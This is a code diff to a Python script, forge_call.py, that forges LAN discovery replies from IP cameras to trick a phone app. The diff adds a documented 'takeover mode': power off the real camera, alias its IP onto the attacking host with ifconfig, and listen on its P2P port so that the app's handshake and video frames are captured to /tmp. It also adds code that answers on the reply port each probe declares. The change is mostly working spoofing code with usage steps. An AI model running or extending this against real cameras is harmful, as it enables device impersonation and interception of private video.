@@ -32,6 +32,27 @@ capture; only offset 44 and the checksum word change):
 Usage:
     python3 forge_call.py            # run for 120 s, print anything received
     python3 forge_call.py 180
+    python3 forge_call.py 180 --identical
+    python3 forge_call.py 180 --listen=60407
+
+Takeover mode -- the one that still works with current app builds
+-----------------------------------------------------------------
+A running app already knows each camera's LAN endpoint and dials it, so it
+ignores a forged discovery reply while the real camera is answering the same
+probe.  Remove the competitor instead:
+
+    1. with the camera ON, run this once and note the printed
+           [clone] <camera-ip>  port <p2p-port>
+    2. power that camera off
+    3. give this host the camera's address:
+           sudo ifconfig <iface> alias <camera-ip> 255.255.255.0
+    4. python3 forge_call.py 600 --listen=<p2p-port>
+    5. open that camera in the app; it dials <camera-ip>:<p2p-port>, which
+       is now this host, and every frame lands in /tmp/forge_in_*.bin
+    6. undo: sudo ifconfig <iface> -alias <camera-ip>
+
+`--listen` binds a P2P port even when no camera could be cloned, which is
+what makes step 4 possible with the camera switched off.
 """
 import select
 import socket
@@ -50,6 +71,14 @@ _args = [a for a in sys.argv[1:] if not a.startswith("--")]
 # This isolates "is the payload edit being rejected?" from "is the source IP
 # being rejected?"  see P2P_PROTOCOL.md 5d / 5e.
 IDENTICAL = "--identical" in sys.argv
+# --listen=60407[,60599]  extra P2P ports to bind even when the camera that
+# owns them is powered off (the takeover recipe: the app already knows the
+# candidate camera's port from its own earlier discovery, so the only thing
+# missing on this side is a listener there).
+LISTEN = set()
+for _a in sys.argv[1:]:
+    if _a.startswith("--listen="):
+        LISTEN |= {int(x) for x in _a.split("=", 1)[1].split(",") if x.strip()}
 DUR = float(_args[0]) if _args else 120.0
 
 
@@ -94,7 +123,7 @@ def capture_genuine_replies():
 
 def main():
     genuine = capture_genuine_replies()
-    if not genuine:
+    if not genuine and not LISTEN:
         print("[!] captured no genuine replies - nothing to clone", flush=True)
         return 1
 
@@ -138,14 +167,15 @@ def main():
     p2p.setblocking(False)
 
     # Sockets C: bind the cameras' REAL p2p ports on this host.
-    # The app pairs "reply source IP" (us, 192.168.77.20) with the port from
-    # the record, so an unedited clone makes it dial 192.168.77.20:<realport>.
-    # Listening there is what actually captures the CALLING frame.
+    # The app dials the endpoint it already knows: the reply's source IP with
+    # the port the camera advertised.  Listening there is what captures the
+    # handshake -- and during a takeover it is the ONLY thing that matters,
+    # because the camera that owned the address is powered off.
     real_ports = {}
-    for ip, data in forges.items():
-        p = struct.unpack_from("<I", data, 44)[0]
-        if p in real_ports:
-            continue
+    ports_to_bind = {struct.unpack_from("<I", data, 44)[0]
+                     for data in genuine.values()}   # REAL ports: read from
+    ports_to_bind |= LISTEN                          # the genuine reply,
+    for p in sorted(ports_to_bind):                  # never the edited clone
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
@@ -163,6 +193,7 @@ def main():
     t0 = time.time()
     last_send = 0.0
     n = 0
+    seq = 0
 
     print("[listen] discovery :%d   fake p2p :%d   camera ports %s   for %.0f s"
           % (DISC_PORT, FAKE_P2P_PORT, sorted(real_ports), DUR), flush=True)
@@ -170,10 +201,13 @@ def main():
     def blast():
         for forged in forges.values():
             for dest in ({phone} if phone else set(broadcast_addrs())):
-                try:
-                    disc.sendto(forged, (dest, PHONE_PORT))
-                except OSError:
-                    pass
+                for port in phone_ports:
+                    try:
+                        disc.sendto(forged, (dest, port))
+                    except OSError:
+                        pass
+
+    phone_ports = {PHONE_PORT}
 
     while time.time() - t0 < DUR:
         now = time.time()
@@ -198,10 +232,31 @@ def main():
                 if len(data) == 28 and data[0] == 0x70 and data[1] == 0x02:
                     if phone != addr[0]:
                         phone = addr[0]
-                    print("[%6.2fs] PROBE from %s -> answered instantly"
-                          % (now - t0, phone), flush=True)
-                    # Answer on the spot - do not wait for the next cadence tick.
-                    blast()
+                    want = struct.unpack_from("<H", data, 26)[0] or PHONE_PORT
+                    # The probe says who it hunts and where it waits:
+                    #   [4:12]  8-byte slot the app fills when targeting one
+                    #           camera (zero on a blanket sweep)
+                    #   [12:16] probe counter
+                    #   [26:28] reply port the cameras must answer (the app
+                    #           listens for replies there)
+                    slot = data[4:12]
+                    tgt = ("zero (sweep)" if not any(slot)
+                           else "..." + slot.hex()[-4:])
+                    print("[%6.2fs] PROBE %s:%d -> answered :%d  target %s "
+                          "counter 0x%08x%s"
+                          % (now - t0, phone, addr[1], want, tgt,
+                             struct.unpack_from("<I", data, 12)[0],
+                             "" if want == PHONE_PORT
+                             else "  (declared %d)" % want),
+                          flush=True)
+                    if want not in phone_ports:
+                        phone_ports.add(want)
+                    for port in ({want, PHONE_PORT}):
+                        for forged in forges.values():
+                            try:
+                                disc.sendto(forged, (phone, port))
+                            except OSError:
+                                pass
                     last_send = time.time()
                 else:
                     print("[%6.2fs] disc <- %s:%d %d B"
